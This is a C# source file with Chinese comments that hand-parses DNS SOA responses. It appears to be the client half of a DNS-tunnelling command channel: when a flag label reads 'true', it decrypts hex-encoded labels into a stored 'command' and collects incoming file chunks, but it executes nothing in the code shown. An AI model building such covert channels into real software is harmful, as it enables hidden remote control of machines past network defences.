using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace MyDnsClient
{
    public class DnsRespond
    {
        public static void respond(byte[] rec)
        {
            int bitnumber = 12; //DNS 头
            //byte sss = rec.Skip(36).Take(1).ToArray()[0];
            List<string> text = new List<string>();
            List<string> file = new List<string>();
            List<string> flag = new List<string>();
            while (rec.Skip(bitnumber).Take(1).ToArray()[0].ToString() != "0") //判断域名结束
                bitnumber += 1;

            bitnumber += 1;  //跳过域名结束标志位 0
            bitnumber += 4;  //跳过请求中的Type,Class In 
            bitnumber += 2;  //跳过C00C
            if (Convert.ToInt16(rec.Skip(bitnumber).Take(2).ToArray()[1]) == 6)
            {
                //Console.WriteLine("SOA请求应答");
                bitnumber += 10;
                while (rec.Skip(bitnumber).Take(1).ToArray()[0].ToString() != "0")
                {
                    int length = Convert.ToInt16(rec.Skip(bitnumber).Take(1).ToArray()[0]);
                    //Console.WriteLine(length);
                    flag.Add(Encoding.UTF8.GetString(rec.Skip(bitnumber + 1).Take(length).ToArray()));
                    bitnumber += 1;
                    bitnumber += length;
                }
                if (string.Join("", flag) == "true")
                {
                    Options.flag = true;
                    text.Clear();
                    bitnumber += 1;
                    while (rec.Skip(bitnumber).Take(1).ToArray()[0].ToString() != "0") //获取点分域名
                    {
                        int length = Convert.ToInt16(rec.Skip(bitnumber).Take(1).ToArray()[0]);
                        //Console.WriteLine(length);
                        text.Add(Encoding.UTF8.GetString(rec.Skip(bitnumber + 1).Take(length).ToArray()));
                        bitnumber += 1;
                        bitnumber += length;
                    }
                    bitnumber += 1;
                    //Console.WriteLine(string.Join("", text));
                    if (BitConverter.ToInt32(rec.Skip(bitnumber).Take(4).Reverse().ToArray(), 0) == 0)
                        Options.command = Encoding.UTF8.GetString(Encryption.Decrypt(Encryption.HexStringToByteArray(string.Join("", text))));
                    //if (BitConverter.ToInt32(rec.Skip(bitnumber).Take(4).Reverse().ToArray(), 0) == 1)
                    //{

                    //    Options.fileDate.Add(BitConverter.ToInt32(rec.Skip(bitnumber+8).Take(4).Reverse().ToArray(), 0), string.Join("", text));
                    //}
                    bitnumber += 4;
                    if (BitConverter.ToInt32(rec.Skip(bitnumber).Take(4).Reverse().ToArray(), 0) != 0)
                    {
                        Options.fileCount = BitConverter.ToInt32(rec.Skip(bitnumber).Take(4).Reverse().ToArray(), 0);
                        Console.WriteLine(Options.fileCount);
                    }

                }
                if (string.Join("", flag) == "false")
                {
                    //Console.WriteLine("aaaaa");
                    bitnumber += 1;
                    while (rec.Skip(bitnumber).Take(1).ToArray()[0].ToString() != "0") //获取点分域名
                    {
                        int length = Convert.ToInt16(rec.Skip(bitnumber).Take(1).ToArray()[0]);
                        file.Add(Encoding.UTF8.GetString(rec.Skip(bitnumber + 1).Take(length).ToArray()));
                        bitnumber += 1;
                        bitnumber += length;
                    }
                    //Console.WriteLine(string.Join("",file));
                    bitnumber += 1;
                    if (BitConverter.ToInt32(rec.Skip(bitnumber).Take(4).Reverse().ToArray(), 0) == 1)
                    {
                        //Console.WriteLine(BitConverter.ToInt32(rec.Skip(bitnumber + 8).Take(4).Reverse().ToArray(), 0));
                        Options.fileDate.Add(BitConverter.ToInt32(rec.Skip(bitnumber + 8).Take(4).Reverse().ToArray(), 0), string.Join("", file));
                    }
                    Options.flag = false;
                }


            }
            //if (Convert.ToInt16(rec.Skip(bitnumber).Take(2).ToArray()[1]) == 1) //判断返回
            //{
            //    Console.WriteLine("A请求应答");
            //    bitnumber += 10; //跳过TYPE、CLASS、DATA Length、ttl
            //    Console.WriteLine("{0}.{1}.{2}.{3}", rec[bitnumber].ToString(), rec[bitnumber + 1].ToString(), rec[bitnumber + 2].ToString(), rec[bitnumber + 3].ToString());

                //}
                //if (Convert.ToInt16(rec.Skip(bitnumber).Take(2).ToArray()[1]) == 16)
                //{
                //    Console.WriteLine("TXT请求应答");
                //    bitnumber += 10; //跳过TYPE、CLASS、DATA Length、ttl
                //    int txt_length = Convert.ToInt16(rec.Skip(bitnumber).Take(2).ToArray()[1]);
                //    bitnumber += 1; // 跳过txt length
                //    Console.WriteLine(Encoding.UTF8.GetString(rec.Skip(bitnumber).Take(txt_length).ToArray()));

                //}
                //if (Convert.ToInt16(rec.Skip(bitnumber).Take(2).ToArray()[1]) == 5)
                //{
                //    Console.WriteLine("Cname请求应答");
                //    bitnumber += 10; //跳过TYPE、CLASS、DATA Length、ttl
                //    int Cname_length = Convert.ToInt16(rec.Skip(bitnumber).Take(2).ToArray()[1]);
                //    bitnumber += 1; // 跳过txt length
                //    Console.WriteLine(Encoding.UTF8.GetString(rec.Skip(bitnumber).Take(Cname_length).ToArray()));

                //}

        }
    }
}
    
